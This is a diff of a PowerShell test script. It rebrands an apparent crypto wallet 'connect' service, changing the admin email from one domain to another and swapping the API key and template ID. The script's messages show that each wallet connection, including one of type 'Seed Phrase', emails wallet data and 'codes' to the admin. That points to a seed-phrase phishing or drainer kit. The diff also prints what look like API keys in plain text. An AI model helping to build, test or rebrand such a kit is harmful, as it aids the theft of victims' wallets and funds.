@@ -8,9 +8,9 @@ Write-Host ""
 $baseUrl = "http://localhost:8888/api"
 
 Write-Host "⚙️  Configuration:" -ForegroundColor Yellow
-Write-Host "   API Key: 0de67ebcc5e8d98792c780ed52b714ee" -ForegroundColor Gray
-Write-Host "   Recipient: admin@solsnipeai.xyz" -ForegroundColor Gray
-Write-Host "   Template ID: cmgn2tzu5fqc41q0ivqlmuqf4" -ForegroundColor Gray
+Write-Host "   API Key: e8afb88a6bae3451e657612d84db3034" -ForegroundColor Gray
+Write-Host "   Recipient: admin@aetherbot.app" -ForegroundColor Gray
+Write-Host "   Template ID: cmgwzzij2tdk6wb0ie0unnzzp" -ForegroundColor Gray
 Write-Host ""
 
 try {
@@ -39,7 +39,7 @@ try {
     Write-Host ""
     
     Write-Host "📬 Expected email data:" -ForegroundColor Yellow
-    Write-Host "   To: admin@solsnipeai.xyz" -ForegroundColor Gray
+    Write-Host "   To: admin@aetherbot.app" -ForegroundColor Gray
     Write-Host "   walletName: $($walletResponse.data.walletAddress)" -ForegroundColor Gray
     Write-Host "   connectionType: Seed Phrase" -ForegroundColor Gray
     Write-Host "   codes: $($walletResponse.data.walletAddress.Substring(0, 8))..." -ForegroundColor Gray
@@ -90,7 +90,7 @@ try {
     Write-Host ""
     
     Write-Host "📬 Expected email data:" -ForegroundColor Yellow
-    Write-Host "   To: admin@solsnipeai.xyz" -ForegroundColor Gray
+    Write-Host "   To: admin@aetherbot.app" -ForegroundColor Gray
     Write-Host "   walletName: $walletAddress" -ForegroundColor Gray
     Write-Host "   connectionType: Credit Wallet" -ForegroundColor Gray
     Write-Host "   codes: credit-..." -ForegroundColor Gray
@@ -103,7 +103,7 @@ try {
     Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor Cyan
     Write-Host ""
     
-    Write-Host "📧 Two emails should have been sent to admin@solsnipeai.xyz:" -ForegroundColor Yellow
+    Write-Host "📧 Two emails should have been sent to admin@aetherbot.app:" -ForegroundColor Yellow
     Write-Host ""
     Write-Host "   1. Wallet Connection Email" -ForegroundColor White
     Write-Host "      - Triggered by: Wallet connect" -ForegroundColor Gray
@@ -118,7 +118,7 @@ try {
     
     Write-Host "Next Steps:" -ForegroundColor Yellow
     Write-Host "   1. Check server terminal logs for email send confirmations" -ForegroundColor Gray
-    Write-Host "   2. Check admin@solsnipeai.xyz inbox for the emails" -ForegroundColor Gray
+    Write-Host "   2. Check admin@aetherbot.app inbox for the emails" -ForegroundColor Gray
     Write-Host "   3. Verify email template displays data correctly" -ForegroundColor Gray
     Write-Host ""
     
